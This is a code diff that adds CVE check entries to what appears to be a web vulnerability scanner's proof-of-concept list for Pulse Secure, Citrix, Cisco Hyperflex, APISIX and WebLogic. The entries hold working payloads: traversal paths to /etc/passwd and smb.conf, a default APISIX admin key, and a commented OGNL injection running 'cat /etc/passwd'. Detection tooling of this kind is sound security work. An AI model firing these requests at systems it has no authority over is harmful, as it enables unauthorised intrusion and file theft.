@@ -10,6 +10,18 @@ export const poc = [{
     critLevel: 3
 },
 {
+    // UNTESTED!!!
+    title: "LFI: Pulse Secure Pulse (CVE-2019-11510)",
+    rootPaths: [
+        "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+    ],
+    detectResponses: ["root"],
+    detectStatusCodes: ["200"],
+    tags: ["pulse"],
+    cat: "cat-angry",
+    critLevel: 2
+},
+{
     title: "RCE: Confluence Server (CVE-2022-26134)",
     rootPaths: [
         //'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat /etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
@@ -19,6 +31,36 @@ export const poc = [{
     tags: ["confluence"],
     cat: "skull",
     critLevel: 3
+}, {
+    // UNTESTED!!!
+    title: "Apache APISIX (CVE-2022-24112 )",
+    rootPaths: [
+        "/apisix/admin/routes?api_key=edd1c9f034335f136f87ad84b625c8f1"
+    ],
+    detectStatusCodes: ["200"],
+    tags: ["apache"],
+    cat: "skull",
+    critLevel: 3
+},{
+    // UNTESTED!!!
+    title: "RCE: Cisco Hyperflex (CVE-2021-1497)",
+    rootPaths: [
+        "/css/..%2findex.htm"
+    ],
+    detectStatusCodes: ["200"],
+    tags: ["cisco"],
+    cat: "skull",
+    critLevel: 3
+},{
+    // UNTESTED!!!
+    title: "RCE: Citrix (CVE-2019-19781)",
+    rootPaths: [
+        "/vpn/../vpns/cfg/smb.conf",
+    ],
+    detectStatusCodes: ["200"],
+    tags: ["citrix"],
+    cat: "cat-panic",
+    critLevel: 3
 },
 {
     // UNTESTED!!!
@@ -26,7 +68,7 @@ export const poc = [{
     rootPaths: [
         "/console/css/%252e%252e%252fconsole.portal"
     ],
-    detectResponses: ["200"],
+    detectStatusCodes: ["200"],
     tags: ["weblogic"],
     cat: "cat-panic",
     critLevel: 3
